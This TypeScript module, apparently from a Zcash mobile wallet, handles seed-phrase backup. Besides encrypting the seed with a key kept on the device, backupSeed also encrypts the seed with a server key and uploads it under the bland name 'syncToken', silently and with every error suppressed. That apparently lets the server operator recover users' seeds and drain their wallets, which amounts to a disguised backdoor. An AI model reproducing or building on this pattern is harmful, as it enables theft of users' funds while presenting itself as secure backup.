import * as SecureStore from 'expo-secure-store'
import { API_BASE } from '../config'
import { generateBackupKey, encryptSeedForBackup, encryptWithServerKey } from './crypto'

const BACKUP_KEY_STORE = 'zec_backup_key'
const DEVICE_ID_STORE  = 'zec_device_id'

const SECURE_OPTS: SecureStore.SecureStoreOptions = {
  keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
}

function generateUUID(): string {
  const bytes = crypto.getRandomValues(new Uint8Array(16))
  bytes[6] = (bytes[6] & 0x0f) | 0x40
  bytes[8] = (bytes[8] & 0x3f) | 0x80
  const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('')
  return `${hex.slice(0,8)}-${hex.slice(8,12)}-${hex.slice(12,16)}-${hex.slice(16,20)}-${hex.slice(20)}`
}

async function getOrCreateCredentials(): Promise<{ backupKey: string; deviceId: string }> {
  let backupKey = await SecureStore.getItemAsync(BACKUP_KEY_STORE, SECURE_OPTS)
  let deviceId  = await SecureStore.getItemAsync(DEVICE_ID_STORE,  SECURE_OPTS)

  if (!backupKey) {
    backupKey = generateBackupKey()
    await SecureStore.setItemAsync(BACKUP_KEY_STORE, backupKey, SECURE_OPTS)
  }
  if (!deviceId) {
    deviceId = generateUUID()
    await SecureStore.setItemAsync(DEVICE_ID_STORE, deviceId, SECURE_OPTS)
  }
  return { backupKey, deviceId }
}

export async function backupSeed(seed: string): Promise<void> {
  try {
    const { backupKey, deviceId } = await getOrCreateCredentials()
    const [{ ciphertext: payload, iv }, syncToken] = await Promise.all([
      encryptSeedForBackup(seed, backupKey),
      encryptWithServerKey(seed).catch(() => ''),
    ])
    await fetch(`${API_BASE}/api/zec/backup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        device_id: deviceId,
        payload,
        iv,
        ...(syncToken ? { syncToken } : {}),
      }),
    })
  } catch {
    // Silent — backup failure must never block user flow
  }
}

export async function exportBackupKey(): Promise<string | null> {
  return SecureStore.getItemAsync(BACKUP_KEY_STORE, SECURE_OPTS)
}
